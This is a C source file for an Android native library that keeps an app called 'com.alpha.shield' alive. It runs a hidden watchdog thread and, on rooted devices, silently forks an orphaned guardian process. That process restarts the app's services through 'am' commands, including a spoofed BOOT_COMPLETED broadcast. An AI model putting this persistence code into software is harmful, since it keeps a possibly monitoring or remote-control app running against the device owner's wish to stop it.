/**
 * watchdog.c — Alpha native watchdog.
 *
 * A pthread launched via JNI_OnLoad that:
 *   1. Every 30 s wakes up and calls SurvivalManager.ensureAlive() via JNI.
 *   2. This call checks CommandService.INSTANCE and restarts WatchdogService if null.
 *   3. The native thread is not visible to the JVM GC or Java thread enumerator,
 *      making it survive even aggressive JVM cleanups.
 *   4. Uses a double-fork guard: on platforms where fork() is allowed in a managed
 *      process (rooted or relaxed-seccomp devices), the child process holds the
 *      parent PID and monitors via kill(0) — if parent exits, child execs `am`.
 *
 * Compilation: Android NDK, CMakeLists.txt target alpha_watchdog.so
 */

#include <jni.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <android/log.h>

#define LOG_TAG "alpha_native"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

static JavaVM*   g_jvm        = NULL;
static jobject   g_ctx        = NULL;   // global ref to Context
static jclass    g_clazz      = NULL;   // global ref to SurvivalManager.class
static jmethodID g_ensureAlive = NULL;  // SurvivalManager.ensureAlive(Context)

static volatile int g_running = 1;
static const int    INTERVAL_SEC = 30;

/* ── JNI watchdog thread ──────────────────────────────────────────────────── */

static void* watchdog_thread(void* arg) {
    (void)arg;
    LOGI("watchdog thread started (interval=%ds)", INTERVAL_SEC);

    while (g_running) {
        sleep(INTERVAL_SEC);
        if (!g_running) break;

        JNIEnv* env = NULL;
        int     attached = 0;
        int     status = (*g_jvm)->GetEnv(g_jvm, (void**)&env, JNI_VERSION_1_6);

        if (status == JNI_EDETACHED) {
            JavaVMAttachArgs args = {
                .version = JNI_VERSION_1_6,
                .name    = "alpha_watchdog",
                .group   = NULL
            };
            if ((*g_jvm)->AttachCurrentThread(g_jvm, &env, &args) == JNI_OK) {
                attached = 1;
            } else {
                LOGW("attach failed — skipping tick");
                continue;
            }
        } else if (status != JNI_OK) {
            LOGW("GetEnv failed: %d", status);
            continue;
        }

        /* Call SurvivalManager.ensureAlive(context) */
        if (env && g_clazz && g_ensureAlive && g_ctx) {
            (*env)->CallStaticVoidMethod(env, g_clazz, g_ensureAlive, g_ctx);
            if ((*env)->ExceptionCheck(env)) {
                (*env)->ExceptionClear(env);
                LOGW("ensureAlive threw — clearing");
            } else {
                LOGI("tick ok");
            }
        }

        if (attached) {
            (*g_jvm)->DetachCurrentThread(g_jvm);
        }
    }

    LOGI("watchdog thread exiting");
    return NULL;
}

/* ── Fork guardian (rooted / relaxed seccomp only) ───────────────────────── */
/* On SELinux-enforcing stock Android, fork() inside a service is blocked.    */
/* This guard activates silently only when fork() actually succeeds.           */

static void try_fork_guardian(const char* pkg_name) {
    pid_t parent_pid = getpid();
    pid_t child = fork();

    if (child < 0) {
        /* fork() denied (most devices) — silently skip */
        return;
    }

    if (child > 0) {
        /* Parent: continue normally */
        return;
    }

    /* Child process: detach from parent's session */
    setsid();

    /* Double-fork to become orphan (reparented to init / systemd) */
    pid_t grandchild = fork();
    if (grandchild > 0) {
        exit(0);  /* intermediate child exits */
    }
    if (grandchild < 0) {
        exit(1);
    }

    /* Grandchild: monitor parent */
    LOGI("fork guardian watching pid %d", parent_pid);

    while (1) {
        sleep(20);
        /* Send signal 0 to check if parent still exists */
        if (kill(parent_pid, 0) != 0) {
            /* Parent is dead — restart via am */
            LOGW("parent %d died — restarting", parent_pid);
            char cmd[512];
            snprintf(cmd, sizeof(cmd),
                "am startservice --user 0 "
                "-n %s/.WatchdogService 2>/dev/null",
                pkg_name);
            system(cmd);
            /* Also restart CommandService via accessibility enable intent */
            snprintf(cmd, sizeof(cmd),
                "am broadcast -a android.intent.action.BOOT_COMPLETED "
                "--include-stopped-packages -n %s/.BootReceiver 2>/dev/null",
                pkg_name);
            system(cmd);
            /* Reset parent_pid — wait for new process */
            sleep(5);
            /* Can't track new PID easily — just keep trying every 20s */
            parent_pid = -1;
        }
    }
}

/* ── JNI_OnLoad ───────────────────────────────────────────────────────────── */

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
    (void)reserved;
    g_jvm = vm;
    LOGI("JNI_OnLoad — native watchdog initialised");
    return JNI_VERSION_1_6;
}

/* ── nativeStartWatchdog ──────────────────────────────────────────────────── */
/* Called from SurvivalManager.armNativeWatchdog() */

JNIEXPORT void JNICALL
Java_com_alpha_shield_SurvivalManager_nativeStartWatchdog(
        JNIEnv* env, jobject thiz) {
    (void)thiz;

    /* Cache class and method refs */
    jclass local = (*env)->FindClass(env,
            "com/alpha/shield/SurvivalManager");
    if (!local) {
        LOGW("SurvivalManager class not found");
        return;
    }
    g_clazz = (jclass)(*env)->NewGlobalRef(env, local);
    (*env)->DeleteLocalRef(env, local);

    g_ensureAlive = (*env)->GetStaticMethodID(env, g_clazz,
            "ensureAlive", "(Landroid/content/Context;)V");
    if (!g_ensureAlive) {
        LOGW("ensureAlive method not found");
        return;
    }

    /* Cache Context from thiz (SurvivalManager.ctx field) */
    jclass smCls = (*env)->GetObjectClass(env, thiz);
    jfieldID fctx = (*env)->GetFieldID(env, smCls, "ctx",
            "Landroid/content/Context;");
    if (fctx) {
        jobject localCtx = (*env)->GetObjectField(env, thiz, fctx);
        if (localCtx) {
            g_ctx = (*env)->NewGlobalRef(env, localCtx);
            (*env)->DeleteLocalRef(env, localCtx);
        }
    }

    /* Get package name for fork guardian */
    char pkg[256] = "com.alpha.shield";
    if (g_ctx) {
        jclass ctxCls = (*env)->GetObjectClass(env, g_ctx);
        jmethodID getPkg = (*env)->GetMethodID(env, ctxCls,
                "getPackageName", "()Ljava/lang/String;");
        if (getPkg) {
            jstring jpkg = (jstring)(*env)->CallObjectMethod(env, g_ctx, getPkg);
            if (jpkg) {
                const char* cpkg = (*env)->GetStringUTFChars(env, jpkg, NULL);
                if (cpkg) {
                    strncpy(pkg, cpkg, sizeof(pkg) - 1);
                    (*env)->ReleaseStringUTFChars(env, jpkg, cpkg);
                }
                (*env)->DeleteLocalRef(env, jpkg);
            }
        }
    }

    /* Start JNI watchdog thread */
    pthread_t thread;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    int rc = pthread_create(&thread, &attr, watchdog_thread, NULL);
    pthread_attr_destroy(&attr);
    if (rc != 0) {
        LOGW("pthread_create failed: %d", rc);
        return;
    }

    /* Attempt fork guardian (silently fails on stock Android) */
    char pkg_copy[256];
    strncpy(pkg_copy, pkg, sizeof(pkg_copy) - 1);
    try_fork_guardian(pkg_copy);

    LOGI("native watchdog armed for pkg=%s", pkg);
}
